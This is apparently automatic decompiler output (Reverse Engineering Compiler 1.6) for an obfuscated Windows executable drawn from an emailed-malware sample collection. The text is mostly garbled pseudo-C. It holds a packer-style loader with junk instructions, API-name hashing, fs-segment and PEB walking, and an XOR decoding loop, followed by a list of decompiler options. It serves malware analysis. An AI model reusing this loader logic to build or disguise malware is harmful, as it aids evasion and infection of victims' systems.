/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1916/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401107 -> 00401059 */
/* DEST BLOCK NOT FOUND: 0040110e -> 00401059 */
/*	Procedure: 0x004010F8 - 0x00401225
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004010F8(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffc;



    edx = edx + ebp;
    asm("Unknown opcode 0xc1");
    asm("int1");
    eax = eax | 268699496;
    asm("sbb byte [esi-0x3f],0xc6");
    ch = ch + *ecx;
    goto L00007ee8;
    goto ( *edi);
    edx = edx & -981675331;
    esi = esi ^ edx;
    ecx = ecx - 1;
    edi = edi & ebp;
    ecx = ecx ^ -258917282;
    esi = esi - edi;
    eax = eax >> 19;
    si = si - 67;
    edx = edx + *esp;
    edi = esp;
    asm("Unknown opcode 0xc1");
    *edx = ~( *edx);
    esi = -536862721;
    asm("rol esi,0x3");
    edi = edi & esi;
    cx = cx - -128;
    edx = 50332160;
    asm("ror edx,0x7");
    asm("ror si,0x4");
    edx = edx + edi;
    ecx = 0;
    ecx = *edx;
    asm("cld");
    edi = ecx;
    esi = 15;
    asm("rol esi,0x2");
    edx = edx | 2144345493;
    ecx = ecx + esi;
    edx = *ecx;
    asm("cld");
    eax = 7680;
    asm("ror eax,0x7");
    ecx = ecx + eax + edx;
    asm("stc");
    edx = *ecx - -28;
    asm("wait");
    esi = edx + edi;
    eax = *esi + edi;
    esi = esi - -4;
    edx = *esi + edi;
    asm("clc");
    ecx = *(esi + 4);
    asm("cmc");
    ecx = ecx + edi;
    asm("cld");
    (save)ecx;
    (save)eax;
    asm("wait");
    eax = edx;
    asm("cmc");
    edi = A8;
    (save)0;
    ecx = A4;
    (save)ecx;
    asm("cld");
    (restore)esi;
    ecx = ecx + *eax;
    edx = 0;
    asm("wait");
L004011ba:
    dl = dl + *ecx;
    asm("wait");
    ecx = ecx + 1;
    asm("cmc");
    asm("rol edx,0x17");
    asm("clc");
    edx = edx ^ 598719059;
    if(*ecx != 0) {
        goto L004011ba;
    }
    if((edx ^ edi) != 0) {
        (restore)edx;
        edx = edx + 1;
        asm("cld");
        (save)edx;
        eax = eax + 4;
        ecx = *eax + esi;
        edx = 0;
        asm("stc");
        goto L004011ba;
    }
    (restore)ecx;
    edi = Vfffffffc;
    ecx = ecx << 1;
    asm("cmc");
    edi = edi + ecx;
    edx = 0;
    asm("cmc");
    dx = *edi;
    asm("stc");
    edx = edx << 2;
    (restore)edi;
    (save)edi;
    asm("cld");
    edi = edi + edx;
    (restore)ecx;
    asm("cmc");
    eax = *edi;
    (restore)ecx;
    asm("wait");
    eax = eax + esi;
    asm("cld");
    asm("ror cx,0xd");
    (restore)edi;
    edx = edx - ecx;
    esp = esp + 8;
    goto ( *edi);
    esi = esi >> 22;
    edi = !edi;
}

/* DEST BLOCK NOT FOUND: 00401242 -> 004011ba */
/*	Procedure: 0x00401226 - 0x00401252
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401226()
{



    eax = eax + 1859188374;
    esi = esi ^ 2000872749;
    edi = -1073217021;
    asm("rol edi,0x3");
    edx = !edx;
    ecx = *edi;
    ax = ax + -23;
    goto ( *ecx);
    esi = esi + 1;
    eax = !eax;
    asm("Unknown opcode 0xc1");
    *ebx & -299246857;
    eax = eax + *esp;
    ecx = ecx + ebx;
}

/*	Procedure: 0x00401253 - 0x00401286
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401253()
{



    esi = esi + ecx;
    asm("rol ax,0x6");
    edi = 67174880;
    asm("ror edi,0x4");
    asm("Unknown opcode 0xc1");
    asm("repne sbb [ebx+0xffd6010f],ecx");
    asm("loope 0x401262");
    asm("salc");
    eax = eax + -1014353298;
    di = di | -74;
    asm("rol dx,0x2");
    esi = esi - 1;
    ecx = ecx & 138775573;
    eax = eax - -715422035;
}

/* DEST BLOCK NOT FOUND: 004015a5 -> 004010f8 */
/*	Procedure: 0x00401287 - 0x004015BE
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A8)
/* unknown */ void  A8;
{



    ecx = ecx & edx;
    eax = esp;
    esi = esi - -1170490843;
    edx = 1048560;
    asm("ror edx,0x4");
    ecx = ecx ^ 474485157;
    eax = eax & edx;
    esi = esi + 44569213;
    ecx = 1572864;
    asm("ror ecx,0x2");
    asm("ror edi,0xf");
    ecx = ecx + eax;
    esi = esi & 86797870;
    for(esi = *ecx; 1; edx = edx ^ -813820539) {
        ecx = ecx - 1097543021;
        edi = -889;
        asm("ror edi,0x3");
        dx = dx - 115;
        esi = esi + 1;
        edx = esi;
        eax = eax | 755025549;
        edi = edi - *edx;
        ecx = ecx - ebx;
        if(edi == 0) {
            break;
        }
    }
    asm("ror ax,0xa");
    edi = edi - ebx;
    esi = esi - 1;
    ecx = ecx & -923756131;
    edi = 1073741826;
    asm("rol edi,0x6");
    eax = eax + edx;
    edx = 0;
    asm("rol ecx,0xb");
    edx = *esi - 144;
    edi = edi + ebx;
    asm("xchg edx,ecx");
    esi = esi & edx;
    asm("rep movsb");
    asm("ror ax,0x6");
    eax = eax + ecx;
    edi = 1074791480;
    asm("rol edi,0x2");
    edx = edx - 1;
    esi = *edi;
    asm("Unknown opcode 0xc1");
    asm("int1");
    asm("sbb edx,[esi+0x66]");
    asm("rol eax,0x9");
    edi = -134214146;
    asm("rol edi,0x7");
    asm("ror edx,0x8");
    edx = *edi;
    (save) *%fs:ecx];
    edx = edx + eax - eax;
    edi = edi & 1142751525;
    esi = esp;
    ecx = !L00000000;
    (save)esi;
    esi = esi - 1;
    (restore)ecx;
    edi = edi & 184252605;
    *%fs:esi] = ecx;
    esi = 0 - edx + ecx;
    edx = esp;
    ecx = ecx >> 30;
    edx = edx + 8;
    esi = esi + edi;
    edi = *edx;
    asm("rol eax,0x2");
    goto L00401397;
    si = si | 83;
    goto L00401381;
L00401397:
    while(1) {
        edx = edx >> 13;
        eax = eax - 529654349;
L00401381:
        if(*edi == 195) {
            esi = esi + ebp;
            asm("xchg eax,edi");
            edx = edx ^ 645224221;
            goto ( *eax);
            si = si - -30;
        }
        esi = esi + 1;
        edi = edi - 1;
    }
    edx = edx + esi;
    edx = edx + cx - -49;
    ecx = A8;
    ax = ax + -68;
    asm("xchg ecx,esp");
    asm("Unknown opcode 0xc1");
    asm("repne adc [ebx+0x3158243c],ecx");
    asm("mul byte [ecx+ecx*4+0x3e]");
    ecx = ecx | -453699794;
    esp = esp + 4;
    asm("cmc");
    edx = 977016932;
    asm("rol edx,0x1");
    asm("stc");
    edx = edx + -1954033816;
    ecx = *( *%fs:edx] + 12);
    esi = 14;
    asm("rol esi,0x1");
    asm("cmc");
    ecx = ecx + esi;
    edi = *ecx;
    edx = *edi;
    esi = 256;
    asm("ror esi,0x5");
    asm("stc");
    edx = edx + esi;
    eax = *edx;
    asm("clc");
    (save)469894675;
    esi = 0;
    ebp = eax;
    (save)eax;
    asm("Unknown opcode 0xc1");
    asm("repne add ch,al");
    if(!(edi = edi & ecx)) {
        *eax = *eax + al;
    }
    edi = edi + edi;
    (save)41680;
    ecx = ecx ^ 703143421;
    (save)64;
    esi = esi - -1051768171;
    *eax();
    ebx = eax;
    *(eax + 40970) = ebp;
    edi = edi - -1457704859;
    (save)-830481040;
    asm("rol ecx,0x1b");
    (save)ebp;
    asm("rol si,0x3");
    L00401253();
    esi = esi + edx;
    edi = ebx;
    cx = cx - 104;
    asm("cld");
    edi = edi + 40985;
    asm("Unknown opcode 0xc1");
    asm("repne sbb ecx,[ecx+0x45684f07]");
    asm("sbb [ecx],ebp");
    ecx = ecx + edx;
    (save)ebp;
    eax = eax >> 28;
    L00401226();
    esi = esi & ebp;
    ecx = ebx;
    edx = edx | 580631397;
    ecx = ecx - -41003;
    asm("ror edi,0x18");
    *ecx = eax;
    si = si | 102;
    edx = edx - 1;
    eax = eax | 913322445;
    L004010F8(ebp, 791414652);
    esi = esi | -45176475;
    asm("wait");
    edi = esp;
    asm("ror edx,0x6");
    (save)edi + -101;
    esi = esi + edi + -101;
    (save)64;
    ecx = ecx ^ 449600821;
    esi = 67108864;
    asm("ror esi,0x4");
    edi = !edi;
    edx = *(esi + 60);
    cx = cx - -15;
    esi = *(edx + esi + 80);
    cx = cx + -25;
    (save)esi;
    edx = 262144;
    asm("rol edx,0x4");
    asm("ror esi,0x5");
    *eax(edx);
    asm("ror dx,0xf");
    edx = edx + 1;
    esi = -2147483647;
    asm("rol esi,0x5");
    edi = edi + 1;
    eax = eax + ebx;
    edi = edi - 1;
    eax = eax >> 13;
    edi = *( *%fs:esi] - -4) + 1;
    edx = 268698240;
    asm("ror edx,0x6");
    ax = ax + -5;
    edi = edi + *edx;
    edx = -1072688627;
    asm("rol edx,0x2");
    eax = !eax;
    edx = edx + edi;
    (save)31;
    asm("rol ecx,0x5");
    edi = edi;
    si = si - 1;
    eax = *edx & 255;
    asm("cld");
    edi = edi | -744229987;
    asm("rol al,0x5");
    esi = esi ^ -783669947;
    al = al ^ 147;
    asm("stc");
    edi = edi + ebp;
    *edx = al;
    asm("clc");
    asm("cld");
    edx = edx + 1;
    asm("stc");
    edi = edi - ebx;
    asm("loop 0x401534");
    ax = ax + -103;
    edx = edx - 1;
    si = si + -87;
    eax = 134349120;
    asm("ror eax,0x5");
    edi = edi + *esp;
    ecx = *eax;
    edx = edx + ebp;
    ecx = ecx + 4212791;
    eax = eax & 1367052622;
    (save)ecx;
    asm("ror si,0xe");
    return;
    esi = esi - -1693561301;
    dx = dx + -26;
    asm("Unknown opcode 0xc1");
    asm("lock or al,0x1");
    *(edx + 2013331520) = *(edx + 2013331520) >> 1;
    asm("rol edx,0x6");
    asm("ror eax,0x1b");
    edi = *edx;
    esi = esi & -877642547;
    goto ( *edi);
    eax = eax & edx;
    dx = dx + 30;
    asm("ror ecx,0x11");
    edi = edi & eax;
    eax = eax | -294646666;
    edx = edx - 1;
    esi = esi ^ -1817796491;
}

/* address  size  */
/* 0x00401287       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
